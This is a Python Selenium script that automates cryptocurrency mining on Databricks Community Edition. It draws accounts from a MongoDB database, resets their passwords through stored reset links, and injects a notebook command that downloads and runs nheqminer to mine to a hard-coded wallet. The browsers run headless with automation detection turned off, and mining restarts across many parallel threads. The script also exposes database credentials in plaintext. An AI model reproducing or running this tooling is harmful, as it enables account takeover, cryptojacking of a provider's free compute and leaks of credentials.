from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from pymongo import MongoClient
import pymongo
import requests
import time
import string
import random
import os
import threading
import json
print('''
  ###########################################################################
           ____            ____              ____            _           _
          |  _ \ ___  _ __|  _ \ __ _ _ __  |  _ \ _ __ ___ (_) ___  ___| |_
          | |_) / _ \| '__| |_) / _` | '__| | |_) | '__/ _ \| |/ _ \/ __| __|
          |  __/ (_) | |  |  __/ (_| | |    |  __/| | | (_) | |  __/ (__| |_
          |_|   \___/|_|  |_|   \__,_|_|    |_|   |_|  \___// |\___|\___|\__|
                                                      |__/
                                                           Not my Idea at all
  ###########################################################################
  ''')
multitab = 8 # vps4-8 chay 20 chrome, vps databricks 2-10 chay max 5-10tab
wallet   ="RDD9mUShEa4WU894zdknpkZJnLbLeWMXf4"
worker   =".Cloud-DB"
scriptmining= "!wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l eu.luckpool.net:3960 -u "+wallet+worker+" -p x -t 2"
passwork   ="1234Abcdf@"
timeopen=120
timewaiting=120
client = MongoClient("mongodb+srv://Quocnd174202:Quocnd174202@cluster0.ivpah.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
db = client.get_database('Databricks')
data =db.Account
active=db.Active
def getacc():
   listdata= list(data.find())
   dataacc=random.choice(listdata)
   linkreset=dataacc["linkreset"]
   email=dataacc["email"]
   firstname=dataacc["firstname"]
   lastname=dataacc["lastname"]
   title=dataacc["title"]
   company=dataacc["company"]
   return linkreset
   data.delete_one({'linkreset': linkreset})
   newacc={
	'email':gmail,
	'pass':passwork,
	'firstname':firstname,
	'lastname': lastname,
	'title':title,
	'company':company,
	'linkreset': linkreset    
	}
   active.insert_one(newacc)
def resetpass(linkreset,driver,waiting):
    driver.get(linkreset)
    time.sleep(5)
    driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[1]/input').send_keys(passwork)
    driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[2]/input').send_keys(passwork)
    time.sleep(1)
    driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[3]/button').click()
    print("Chrome",waiting,"Login OK...")
def autodatabricks(driver,waiting):
 time.sleep(20)
 print("Chrome",waiting,":Setup Note")
 driver.find_element_by_xpath('//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]').click()
 time.sleep(4)
 cluster= "Chrome "+str(waiting)
 driver.find_element_by_xpath('//*[@id="input"]').send_keys(cluster)
 time.sleep(4)
 driver.find_element_by_xpath('/html/body/div[8]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]').click()
 time.sleep(15)
 driver.find_element_by_css_selector(".CodeMirror-line").click()
 driver.find_element_by_css_selector(".CodeMirror textarea").send_keys(scriptmining)
 driver.find_element_by_css_selector(".fa-play").click()
 driver.find_element_by_css_selector(".run-cell > .fa").click()
 driver.find_element_by_xpath("/html/body/uses-legacy-bootstrap[14]/div/uses-legacy-bootstrap/div/div[1]/div/div/input").click()
 driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[14]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()
 time.sleep(4)
 driver.minimize_window()
 clearConsole()
 print("Chrome",waiting,"Start Mining Coin .....")
 while (True):
     time.sleep(120)
     driver.refresh()
     clearConsole()
     time.sleep(10)
     print("Chrome",waiting,"Check vps")
     checkerror=checkvps(driver,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]')
     if driver.title == "Login - Databricks Community Edition" :
          print("Chrome :",waiting,"Databricks logout")
          driver.quit()
          newauto(waiting)
     if checkerror==True :
         time.sleep(1)
         texterror = driver.find_element_by_xpath('//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]/div[1]/div/div/div/div').text
         time.sleep(1)
         datatext = texterror.split(":")
         if len(datatext)>2 :
           time.sleep(1)
           errortext= (datatext[0]+":",datatext[1])
           time.sleep(1)
           if errortext =="Cancel Waiting for cluster to start: Unexpected failure during launch. databricks_error_message" :
              print("Chrome",waiting,"ERROR ==>",errortext)
              driver.find_element_by_xpath('//*[@id="stopExecution"]').click()
              time.sleep(5)
              driver.find_element_by_css_selector(".fa-play").click()
              driver.find_element_by_css_selector(".run-cell > .fa").click()
         if texterror == "The spark driver has stopped unexpectedly and is restarting. Your notebook will be automatically reattached.":
            print("Chrome",waiting,"ERROR ==> The spark driver has stopped unexpectedly and is restarting. Your notebook will be automatically reattached.")
            driver.find_element_by_css_selector(".fa-play").click()
            driver.find_element_by_css_selector(".run-cell > .fa").click()
         if texterror == "Internal error, sorry. Attach your notebook to a different cluster or restart the current cluster.":
            print("Chrome",waiting,"ERROR ==>Internal error, sorry. Attach your notebook to a different cluster or restart the current cluster.")
            driver.find_element_by_css_selector(".fa-play").click()
            driver.find_element_by_css_selector(".run-cell > .fa").click()
         if texterror == "Cancelled":
            print("Chrome",waiting,"ERROR ==> Cancelled")
            driver.find_element_by_css_selector(".fa-play").click()
            driver.find_element_by_css_selector(".run-cell > .fa").click()
         if texterror == "":
            print("Chrome",waiting,"ERROR ==> STOP VPS")
            driver.find_element_by_css_selector(".fa-play").click()
            driver.find_element_by_css_selector(".run-cell > .fa").click()
     print("Chrome",waiting,driver.title)
     print("Chrome",waiting,"Running Miner Coin...")
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)
def checkvps(driver,xpath):
    try:
        element = driver.find_element_by_xpath(xpath)
    except NoSuchElementException as e:
        return False
    return True

def autominer(waiting):
   option = webdriver.ChromeOptions()
   option.add_experimental_option("excludeSwitches", ["enable-automation"])
   option.add_experimental_option('useAutomationExtension', False)
   option.add_argument('--disable-blink-features=AutomationControlled')
   option.add_argument('--no-sandbox')
   option.add_argument('--headless')
   option.add_argument('--disable-dev-shm-usage')
   drivers = webdriver.Chrome(executable_path="chromedriver",options=option)
   drivers.set_window_size(800, 1200)
   drivers.minimize_window() 
   try:
      linkresetpas = getacc()
      print(linkresetpas)
      resetpass(linkresetpas,drivers,waiting)
      autodatabricks(drivers,waiting)
   except Exception as e:
     print(e)
     drivers.close()
     drivers.quit()
     time.sleep(timewaiting)
     reauto(waiting)

def auto(waiting):
     autominer(waiting)

def newauto(waiting):
       auto(waiting)
def reauto(waiting):
       auto(waiting)

def multichrome(l):
    print("Start Chrome",l,":Runing...")
    auto(l)
def startauto():
    threads =[]
    for l in range(multitab):
        threads += [threading.Thread(target=multichrome,args={l})]
    for t in threads:
        t.start()
        time.sleep(timeopen)
    for t in threads:
        t.join()
    print("End Multi Chrome Tab")
startauto()
